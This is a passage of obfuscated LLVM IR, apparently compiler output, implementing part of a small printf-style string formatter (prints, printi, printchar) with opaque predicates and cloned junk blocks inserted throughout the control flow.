  br label %347

; <label>:326:                                    ; preds = %298
  %327 = load i32, i32* @x.29
  %328 = load i32, i32* @y.30
  %329 = sub i32 %327, 1
  %330 = mul i32 %327, %329
  %331 = urem i32 %330, 2
  %332 = icmp eq i32 %331, 0
  %333 = icmp slt i32 %328, 10
  %334 = or i1 %332, %333
  br i1 %334, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %326
  %335 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %300, i32 0, i32 2
  %336 = load i8*, i8** %335, align 8
  %337 = bitcast i8* %336 to i32*
  %338 = getelementptr i8, i8* %336, i32 8
  store i8* %338, i8** %335, align 8
  %339 = load i32, i32* @x.29
  %340 = load i32, i32* @y.30
  %341 = sub i32 %339, 1
  %342 = mul i32 %339, %341
  %343 = urem i32 %342, 2
  %344 = icmp eq i32 %343, 0
  %345 = icmp slt i32 %340, 10
  %346 = or i1 %344, %345
  br i1 %346, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br label %347

; <label>:347:                                    ; preds = %originalBBpart253, %originalBBpart249
  %348 = phi i32* [ %316, %originalBBpart249 ], [ %337, %originalBBpart253 ]
  %349 = load i32, i32* @x.29
  %350 = load i32, i32* @y.30
  %351 = sub i32 %349, 1
  %352 = mul i32 %349, %351
  %353 = urem i32 %352, 2
  %354 = icmp eq i32 %353, 0
  %355 = icmp slt i32 %350, 10
  %356 = or i1 %354, %355
  br i1 %356, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %347
  %357 = load i32, i32* %348, align 4
  %358 = load i32, i32* %7, align 4
  %359 = load i32, i32* %8, align 4
  %360 = call i32 @printi(i8** %299, i32 %357, i32 16, i32 0, i32 %358, i32 %359, i32 97)
  %361 = load i32, i32* %9, align 4
  %362 = add nsw i32 %361, %360
  store i32 %362, i32* %9, align 4
  %363 = load i32, i32* @x.29
  %364 = load i32, i32* @y.30
  %365 = sub i32 %363, 1
  %366 = mul i32 %363, %365
  %367 = urem i32 %366, 2
  %368 = icmp eq i32 %367, 0
  %369 = icmp slt i32 %364, 10
  %370 = or i1 %368, %369
  br i1 %370, label %originalBBpart262, label %originalBB55alteredBB

originalBBpart262:                                ; preds = %originalBB55
  br label %523

; <label>:371:                                    ; preds = %293
  %372 = load i8*, i8** %5, align 8
  %373 = load i8, i8* %372, align 1
  %374 = zext i8 %373 to i32
  %375 = icmp eq i32 %374, 88
  br i1 %375, label %376, label %401

; <label>:376:                                    ; preds = %371
  %377 = load i8**, i8*** %4, align 8
  %378 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %379 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %378, i32 0, i32 0
  %380 = load i32, i32* %379, align 8
  %381 = icmp ule i32 %380, 40
  br i1 %381, label %382, label %388

; <label>:382:                                    ; preds = %376
  %383 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %378, i32 0, i32 3
  %384 = load i8*, i8** %383, align 8
  %385 = getelementptr i8, i8* %384, i32 %380
  %386 = bitcast i8* %385 to i32*
  %387 = add i32 %380, 8
  store i32 %387, i32* %379, align 8
  br label %393

; <label>:388:                                    ; preds = %376
  %389 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %378, i32 0, i32 2
  %390 = load i8*, i8** %389, align 8
  %391 = bitcast i8* %390 to i32*
  %392 = getelementptr i8, i8* %390, i32 8
  store i8* %392, i8** %389, align 8
  br label %393

; <label>:393:                                    ; preds = %388, %382
  %394 = phi i32* [ %386, %382 ], [ %391, %388 ]
  %395 = load i32, i32* %394, align 4
  %396 = load i32, i32* %7, align 4
  %397 = load i32, i32* %8, align 4
  %398 = call i32 @printi(i8** %377, i32 %395, i32 16, i32 0, i32 %396, i32 %397, i32 65)
  %399 = load i32, i32* %9, align 4
  %400 = add nsw i32 %399, %398
  store i32 %400, i32* %9, align 4
  br label %523

; <label>:401:                                    ; preds = %371
  %402 = load i32, i32* @x.29
  %403 = load i32, i32* @y.30
  %404 = sub i32 %402, 1
  %405 = mul i32 %402, %404
  %406 = urem i32 %405, 2
  %407 = icmp eq i32 %406, 0
  %408 = icmp slt i32 %403, 10
  %409 = or i1 %407, %408
  br i1 %409, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %401
  %410 = load i8*, i8** %5, align 8
  %411 = load i8, i8* %410, align 1
  %412 = zext i8 %411 to i32
  %413 = icmp eq i32 %412, 117
  %414 = load i32, i32* @x.29
  %415 = load i32, i32* @y.30
  %416 = sub i32 %414, 1
  %417 = mul i32 %414, %416
  %418 = urem i32 %417, 2
  %419 = icmp eq i32 %418, 0
  %420 = icmp slt i32 %415, 10
  %421 = or i1 %419, %420
  br i1 %421, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br i1 %413, label %422, label %447

; <label>:422:                                    ; preds = %originalBBpart266
  %423 = load i8**, i8*** %4, align 8
  %424 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %425 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %424, i32 0, i32 0
  %426 = load i32, i32* %425, align 8
  %427 = icmp ule i32 %426, 40
  br i1 %427, label %428, label %434

; <label>:428:                                    ; preds = %422
  %429 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %424, i32 0, i32 3
  %430 = load i8*, i8** %429, align 8
  %431 = getelementptr i8, i8* %430, i32 %426
  %432 = bitcast i8* %431 to i32*
  %433 = add i32 %426, 8
  store i32 %433, i32* %425, align 8
  br label %439

; <label>:434:                                    ; preds = %422
  %435 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %424, i32 0, i32 2
  %436 = load i8*, i8** %435, align 8
  %437 = bitcast i8* %436 to i32*
  %438 = getelementptr i8, i8* %436, i32 8
  store i8* %438, i8** %435, align 8
  br label %439

; <label>:439:                                    ; preds = %434, %428
  %440 = phi i32* [ %432, %428 ], [ %437, %434 ]
  %441 = load i32, i32* %440, align 4
  %442 = load i32, i32* %7, align 4
  %443 = load i32, i32* %8, align 4
  %444 = call i32 @printi(i8** %423, i32 %441, i32 10, i32 0, i32 %442, i32 %443, i32 97)
  %445 = load i32, i32* %9, align 4
  %446 = add nsw i32 %445, %444
  store i32 %446, i32* %9, align 4
  br label %523

; <label>:447:                                    ; preds = %originalBBpart266
  %448 = load i8*, i8** %5, align 8
  %449 = load i8, i8* %448, align 1
  %450 = zext i8 %449 to i32
  %451 = icmp eq i32 %450, 99
  br i1 %451, label %452, label %481

; <label>:452:                                    ; preds = %447
  %453 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %454 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %453, i32 0, i32 0
  %455 = load i32, i32* %454, align 8
  %456 = icmp ule i32 %455, 40
  br i1 %456, label %457, label %463

; <label>:457:                                    ; preds = %452
  %458 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %453, i32 0, i32 3
  %459 = load i8*, i8** %458, align 8
  %460 = getelementptr i8, i8* %459, i32 %455
  %461 = bitcast i8* %460 to i32*
  %462 = add i32 %455, 8
  store i32 %462, i32* %454, align 8
  br label %468

; <label>:463:                                    ; preds = %452
  %464 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %453, i32 0, i32 2
  %465 = load i8*, i8** %464, align 8
  %466 = bitcast i8* %465 to i32*
  %467 = getelementptr i8, i8* %465, i32 8
  store i8* %467, i8** %464, align 8
  br label %468

; <label>:468:                                    ; preds = %463, %457
  %469 = phi i32* [ %461, %457 ], [ %466, %463 ]
  %470 = load i32, i32* %469, align 4
  %471 = trunc i32 %470 to i8
  %472 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %471, i8* %472, align 1
  %473 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %473, align 1
  %474 = load i8**, i8*** %4, align 8
  %475 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %476 = load i32, i32* %7, align 4
  %477 = load i32, i32* %8, align 4
  %478 = call i32 @prints(i8** %474, i8* %475, i32 %476, i32 %477)
  %479 = load i32, i32* %9, align 4
  %480 = add nsw i32 %479, %478
  store i32 %480, i32* %9, align 4
  br label %523

; <label>:481:                                    ; preds = %447
  br label %522

; <label>:482:                                    ; preds = %17
  %483 = load i32, i32* @x.29
  %484 = load i32, i32* @y.30
  %485 = sub i32 %483, 1
  %486 = mul i32 %483, %485
  %487 = urem i32 %486, 2
  %488 = icmp eq i32 %487, 0
  %489 = icmp slt i32 %484, 10
  %490 = or i1 %488, %489
  br i1 %490, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %482
  %491 = load i32, i32* @x.29
  %492 = load i32, i32* @y.30
  %493 = sub i32 %491, 1
  %494 = mul i32 %491, %493
  %495 = urem i32 %494, 2
  %496 = icmp eq i32 %495, 0
  %497 = icmp slt i32 %492, 10
  %498 = or i1 %496, %497
  br i1 %498, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br label %499

; <label>:499:                                    ; preds = %originalBBpart270, %51
  %500 = load i32, i32* @x.29
  %501 = load i32, i32* @y.30
  %502 = sub i32 %500, 1
  %503 = mul i32 %500, %502
  %504 = urem i32 %503, 2
  %505 = icmp eq i32 %504, 0
  %506 = icmp slt i32 %501, 10
  %507 = or i1 %505, %506
  br i1 %507, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %499
  %508 = load i8**, i8*** %4, align 8
  %509 = load i8*, i8** %5, align 8
  %510 = load i8, i8* %509, align 1
  %511 = zext i8 %510 to i32
  call void @printchar(i8** %508, i32 %511)
  %512 = load i32, i32* %9, align 4
  %513 = add nsw i32 %512, 1
  store i32 %513, i32* %9, align 4
  %514 = load i32, i32* @x.29
  %515 = load i32, i32* @y.30
  %516 = sub i32 %514, 1
  %517 = mul i32 %514, %516
  %518 = urem i32 %517, 2
  %519 = icmp eq i32 %518, 0
  %520 = icmp slt i32 %515, 10
  %521 = or i1 %519, %520
  br i1 %521, label %originalBBpart284, label %originalBB72alteredBB

originalBBpart284:                                ; preds = %originalBB72
  br label %522

; <label>:522:                                    ; preds = %originalBBpart284, %481
  br label %523

; <label>:523:                                    ; preds = %522, %468, %439, %393, %originalBBpart262, %285, %208
  %524 = load i32, i32* @x.29
  %525 = load i32, i32* @y.30
  %526 = sub i32 %524, 1
  %527 = mul i32 %524, %526
  %528 = urem i32 %527, 2
  %529 = icmp eq i32 %528, 0
  %530 = icmp slt i32 %525, 10
  %531 = or i1 %529, %530
  br i1 %531, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %523
  %532 = load i8*, i8** %5, align 8
  %533 = getelementptr inbounds i8, i8* %532, i32 1
  store i8* %533, i8** %5, align 8
  %534 = load i32, i32* @x.29
  %535 = load i32, i32* @y.30
  %536 = sub i32 %534, 1
  %537 = mul i32 %534, %536
  %538 = urem i32 %537, 2
  %539 = icmp eq i32 %538, 0
  %540 = icmp slt i32 %535, 10
  %541 = or i1 %539, %540
  br i1 %541, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br label %12

; <label>:542:                                    ; preds = %originalBBpart2, %12
  %543 = load i32, i32* @x.29
  %544 = load i32, i32* @y.30
  %545 = sub i32 %543, 1
  %546 = mul i32 %543, %545
  %547 = urem i32 %546, 2
  %548 = icmp eq i32 %547, 0
  %549 = icmp slt i32 %544, 10
  %550 = or i1 %548, %549
  br i1 %550, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %542
  %551 = load i8**, i8*** %4, align 8
  %552 = icmp ne i8** %551, null
  %553 = load i32, i32* @x.29
  %554 = load i32, i32* @y.30
  %555 = sub i32 %553, 1
  %556 = mul i32 %553, %555
  %557 = urem i32 %556, 2
  %558 = icmp eq i32 %557, 0
  %559 = icmp slt i32 %554, 10
  %560 = or i1 %558, %559
  br i1 %560, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %552, label %561, label %580

; <label>:561:                                    ; preds = %originalBBpart292
  %562 = load i32, i32* @x.29
  %563 = load i32, i32* @y.30
  %564 = sub i32 %562, 1
  %565 = mul i32 %562, %564
  %566 = urem i32 %565, 2
  %567 = icmp eq i32 %566, 0
  %568 = icmp slt i32 %563, 10
  %569 = or i1 %567, %568
  br i1 %569, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %561
  %570 = load i8**, i8*** %4, align 8
  %571 = load i8*, i8** %570, align 8
  store i8 0, i8* %571, align 1
  %572 = load i32, i32* @x.29
  %573 = load i32, i32* @y.30
  %574 = sub i32 %572, 1
  %575 = mul i32 %572, %574
  %576 = urem i32 %575, 2
  %577 = icmp eq i32 %576, 0
  %578 = icmp slt i32 %573, 10
  %579 = or i1 %577, %578
  br i1 %579, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br label %580

; <label>:580:                                    ; preds = %originalBBpart296, %originalBBpart292
  %581 = load i32, i32* @x.29
  %582 = load i32, i32* @y.30
  %583 = sub i32 %581, 1
  %584 = mul i32 %581, %583
  %585 = urem i32 %584, 2
  %586 = icmp eq i32 %585, 0
  %587 = icmp slt i32 %582, 10
  %588 = or i1 %586, %587
  br i1 %588, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %580
  %589 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %590 = bitcast %struct.__va_list_tag* %589 to i8*
  call void @llvm.va_end(i8* %590)
  %591 = load i32, i32* %9, align 4
  %592 = load i32, i32* @x.29
  %593 = load i32, i32* @y.30
  %594 = sub i32 %592, 1
  %595 = mul i32 %592, %594
  %596 = urem i32 %595, 2
  %597 = icmp eq i32 %596, 0
  %598 = icmp slt i32 %593, 10
  %599 = or i1 %597, %598
  br i1 %599, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  ret i32 %591

originalBBalteredBB:                              ; preds = %originalBB, %29
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %57
  %600 = load i8*, i8** %5, align 8
  %601 = getelementptr inbounds i8, i8* %600, i32 1
  store i8* %601, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %76
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %93
  %602 = load i8*, i8** %5, align 8
  %603 = load i8, i8* %602, align 1
  %604 = zext i8 %603 to i32
  %605 = icmp eq i32 %604, 48
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %154
  %606 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %150, i32 0, i32 3
  %607 = load i8*, i8** %606, align 8
  %608 = getelementptr i8, i8* %607, i32 %152
  %609 = bitcast i8* %608 to i32*
  %_ = sub i32 %152, 8
  %gen = mul i32 %_, 8
  %_15 = sub i32 %152, 8
  %gen16 = mul i32 %_15, 8
  %610 = add i32 %152, 8
  store i32 %610, i32* %151, align 8
  br label %originalBB14

originalBB20alteredBB:                            ; preds = %originalBB20, %176
  %611 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %150, i32 0, i32 2
  %612 = load i8*, i8** %611, align 8
  %613 = bitcast i8* %612 to i32*
  %614 = getelementptr i8, i8* %612, i32 8
  store i8* %614, i8** %611, align 8
  br label %originalBB20

originalBB24alteredBB:                            ; preds = %originalBB24, %215
  %615 = load i8*, i8** %5, align 8
  %616 = load i8, i8* %615, align 1
  %617 = zext i8 %616 to i32
  %618 = icmp eq i32 %617, 100
  br label %originalBB24

originalBB29alteredBB:                            ; preds = %originalBB29, %236
  %619 = load i8**, i8*** %4, align 8
  %620 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %621 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %620, i32 0, i32 0
  %622 = load i32, i32* %621, align 8
  %623 = icmp ule i32 %622, 40
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %258
  %624 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %246, i32 0, i32 3
  %625 = load i8*, i8** %624, align 8
  %626 = getelementptr i8, i8* %625, i32 %248
  %627 = bitcast i8* %626 to i32*
  %_34 = shl i32 %248, 8
  %_35 = sub i32 0, %248
  %gen36 = add i32 %_35, 8
  %_37 = shl i32 %248, 8
  %_38 = sub i32 %248, 8
  %gen39 = mul i32 %_38, 8
  %_40 = sub i32 0, %248
  %gen41 = add i32 %_40, 8
  %628 = add i32 %248, 8
  store i32 %628, i32* %247, align 8
  br label %originalBB33

originalBB45alteredBB:                            ; preds = %originalBB45, %304
  %629 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %300, i32 0, i32 3
  %630 = load i8*, i8** %629, align 8
  %631 = getelementptr i8, i8* %630, i32 %302
  %632 = bitcast i8* %631 to i32*
  %_46 = sub i32 0, %302
  %gen47 = add i32 %_46, 8
  %633 = add i32 %302, 8
  store i32 %633, i32* %301, align 8
  br label %originalBB45

originalBB51alteredBB:                            ; preds = %originalBB51, %326
  %634 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %300, i32 0, i32 2
  %635 = load i8*, i8** %634, align 8
  %636 = bitcast i8* %635 to i32*
  %637 = getelementptr i8, i8* %635, i32 8
  store i8* %637, i8** %634, align 8
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %347
  %638 = load i32, i32* %348, align 4
  %639 = load i32, i32* %7, align 4
  %640 = load i32, i32* %8, align 4
  %641 = call i32 @printi(i8** %299, i32 %638, i32 16, i32 0, i32 %639, i32 %640, i32 97)
  %642 = load i32, i32* %9, align 4
  %_56 = sub i32 %642, %641
  %gen57 = mul i32 %_56, %641
  %_58 = shl i32 %642, %641
  %_59 = shl i32 %642, %641
  %_60 = shl i32 %642, %641
  %643 = add nsw i32 %642, %641
  store i32 %643, i32* %9, align 4
  br label %originalBB55

originalBB64alteredBB:                            ; preds = %originalBB64, %401
  %644 = load i8*, i8** %5, align 8
  %645 = load i8, i8* %644, align 1
  %646 = zext i8 %645 to i32
  %647 = icmp eq i32 %646, 117
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %482
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %499
  %648 = load i8**, i8*** %4, align 8
  %649 = load i8*, i8** %5, align 8
  %650 = load i8, i8* %649, align 1
  %651 = zext i8 %650 to i32
  call void @printchar(i8** %648, i32 %651)
  %652 = load i32, i32* %9, align 4
  %_73 = sub i32 %652, 1
  %gen74 = mul i32 %_73, 1
  %_75 = shl i32 %652, 1
  %_76 = sub i32 0, %652
  %gen77 = add i32 %_76, 1
  %_78 = sub i32 0, %652
  %gen79 = add i32 %_78, 1
  %_80 = shl i32 %652, 1
  %_81 = sub i32 %652, 1
  %gen82 = mul i32 %_81, 1
  %653 = add nsw i32 %652, 1
  store i32 %653, i32* %9, align 4
  br label %originalBB72

originalBB86alteredBB:                            ; preds = %originalBB86, %523
  %654 = load i8*, i8** %5, align 8
  %655 = getelementptr inbounds i8, i8* %654, i32 1
  store i8* %655, i8** %5, align 8
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %542
  %656 = load i8**, i8*** %4, align 8
  %657 = icmp ne i8** %656, null
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %561
  %658 = load i8**, i8*** %4, align 8
  %659 = load i8*, i8** %658, align 8
  store i8 0, i8* %659, align 1
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %580
  %660 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %661 = bitcast %struct.__va_list_tag* %660 to i8*
  call void @llvm.va_end(i8* %661)
  %662 = load i32, i32* %9, align 4
  br label %originalBB98
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = load i32, i32* @x.31
  %6 = load i32, i32* @y.32
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8**, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  store i8** %0, i8*** %13, align 8
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  store i32 %3, i32* %16, align 4
  store i32 0, i32* %17, align 4
  store i32 32, i32* %18, align 4
  %21 = load i32, i32* %15, align 4
  %22 = icmp sgt i32 %21, 0
  %23 = load i32, i32* @x.31
  %24 = load i32, i32* @y.32
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %106

; <label>:31:                                     ; preds = %originalBBpart2
  store i32 0, i32* %19, align 4
  %32 = load i8*, i8** %14, align 8
  store i8* %32, i8** %20, align 8
  br label %33

; <label>:33:                                     ; preds = %40, %31
  %34 = load i8*, i8** %20, align 8
  %35 = load i8, i8* %34, align 1
  %36 = icmp ne i8 %35, 0
  br i1 %36, label %37, label %43

; <label>:37:                                     ; preds = %33
  %38 = load i32, i32* %19, align 4
  %39 = add nsw i32 %38, 1
  store i32 %39, i32* %19, align 4
  br label %40

; <label>:40:                                     ; preds = %37
  %41 = load i8*, i8** %20, align 8
  %42 = getelementptr inbounds i8, i8* %41, i32 1
  store i8* %42, i8** %20, align 8
  br label %33

; <label>:43:                                     ; preds = %33
  %44 = load i32, i32* @x.31
  %45 = load i32, i32* @y.32
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %43
  %52 = load i32, i32* %19, align 4
  %53 = load i32, i32* %15, align 4
  %54 = icmp sge i32 %52, %53
  %55 = load i32, i32* @x.31
  %56 = load i32, i32* @y.32
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %54, label %63, label %80

; <label>:63:                                     ; preds = %originalBBpart24
  %64 = load i32, i32* @x.31
  %65 = load i32, i32* @y.32
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %63
  store i32 0, i32* %15, align 4
  %72 = load i32, i32* @x.31
  %73 = load i32, i32* @y.32
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %84

; <label>:80:                                     ; preds = %originalBBpart24
  %81 = load i32, i32* %19, align 4
  %82 = load i32, i32* %15, align 4
  %83 = sub nsw i32 %82, %81
  store i32 %83, i32* %15, align 4
  br label %84

; <label>:84:                                     ; preds = %80, %originalBBpart28
  %85 = load i32, i32* %16, align 4
  %86 = and i32 %85, 2
  %87 = icmp ne i32 %86, 0
  br i1 %87, label %88, label %105

; <label>:88:                                     ; preds = %84
  %89 = load i32, i32* @x.31
  %90 = load i32, i32* @y.32
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %88
  store i32 48, i32* %18, align 4
  %97 = load i32, i32* @x.31
  %98 = load i32, i32* @y.32
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %105

; <label>:105:                                    ; preds = %originalBBpart212, %84
  br label %106

; <label>:106:                                    ; preds = %105, %originalBBpart2
  %107 = load i32, i32* %16, align 4
  %108 = and i32 %107, 1
  %109 = icmp ne i32 %108, 0
  br i1 %109, label %123, label %110

; <label>:110:                                    ; preds = %106
  br label %111

; <label>:111:                                    ; preds = %119, %110
  %112 = load i32, i32* %15, align 4
  %113 = icmp sgt i32 %112, 0
  br i1 %113, label %114, label %122

; <label>:114:                                    ; preds = %111
  %115 = load i8**, i8*** %13, align 8
  %116 = load i32, i32* %18, align 4
  call void @printchar(i8** %115, i32 %116)
  %117 = load i32, i32* %17, align 4
  %118 = add nsw i32 %117, 1
  store i32 %118, i32* %17, align 4
  br label %119

; <label>:119:                                    ; preds = %114
  %120 = load i32, i32* %15, align 4
  %121 = add nsw i32 %120, -1
  store i32 %121, i32* %15, align 4
  br label %111

; <label>:122:                                    ; preds = %111
  br label %123

; <label>:123:                                    ; preds = %122, %106
  br label %124

; <label>:124:                                    ; preds = %135, %123
  %125 = load i8*, i8** %14, align 8
  %126 = load i8, i8* %125, align 1
  %127 = icmp ne i8 %126, 0
  br i1 %127, label %128, label %138

; <label>:128:                                    ; preds = %124
  %129 = load i8**, i8*** %13, align 8
  %130 = load i8*, i8** %14, align 8
  %131 = load i8, i8* %130, align 1
  %132 = zext i8 %131 to i32
  call void @printchar(i8** %129, i32 %132)
  %133 = load i32, i32* %17, align 4
  %134 = add nsw i32 %133, 1
  store i32 %134, i32* %17, align 4
  br label %135

; <label>:135:                                    ; preds = %128
  %136 = load i8*, i8** %14, align 8
  %137 = getelementptr inbounds i8, i8* %136, i32 1
  store i8* %137, i8** %14, align 8
  br label %124

; <label>:138:                                    ; preds = %124
  %139 = load i32, i32* @x.31
  %140 = load i32, i32* @y.32
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %138
  %147 = load i32, i32* @x.31
  %148 = load i32, i32* @y.32
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %155

; <label>:155:                                    ; preds = %179, %originalBBpart216
  %156 = load i32, i32* %15, align 4
  %157 = icmp sgt i32 %156, 0
  br i1 %157, label %158, label %182

; <label>:158:                                    ; preds = %155
  %159 = load i32, i32* @x.31
  %160 = load i32, i32* @y.32
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %158
  %167 = load i8**, i8*** %13, align 8
  %168 = load i32, i32* %18, align 4
  call void @printchar(i8** %167, i32 %168)
  %169 = load i32, i32* %17, align 4
  %170 = add nsw i32 %169, 1
  store i32 %170, i32* %17, align 4
  %171 = load i32, i32* @x.31
  %172 = load i32, i32* @y.32
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBBpart227, label %originalBB18alteredBB

originalBBpart227:                                ; preds = %originalBB18
  br label %179

; <label>:179:                                    ; preds = %originalBBpart227
  %180 = load i32, i32* %15, align 4
  %181 = add nsw i32 %180, -1
  store i32 %181, i32* %15, align 4
  br label %155

; <label>:182:                                    ; preds = %155
  %183 = load i32, i32* %17, align 4
  ret i32 %183

originalBBalteredBB:                              ; preds = %originalBB, %4
  %184 = alloca i8**, align 8
  %185 = alloca i8*, align 8
  %186 = alloca i32, align 4
  %187 = alloca i32, align 4
  %188 = alloca i32, align 4
  %189 = alloca i32, align 4
  %190 = alloca i32, align 4
  %191 = alloca i8*, align 8
  store i8** %0, i8*** %184, align 8
  store i8* %1, i8** %185, align 8
